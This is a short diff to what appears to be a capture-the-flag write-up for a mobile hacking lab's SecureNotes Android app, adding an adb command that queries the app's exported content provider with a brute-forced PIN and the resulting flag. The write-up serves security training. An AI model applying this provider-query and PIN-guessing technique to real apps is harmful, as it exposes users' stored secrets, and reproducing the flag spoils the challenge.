@@ -405,3 +405,8 @@ if __name__ == "__main__":
 Then run it:
 `$ python snpin_force.py`
 ![[SN_Flag.png]]
+
+`$ adb shell "content query --uri content://com.mobilehackinglab.securenotes.secretprovider --where pin=2580"`
+```
+Row: 0 Secret=CTF{D1d_y0u_gu3ss_1t!1?}
+```
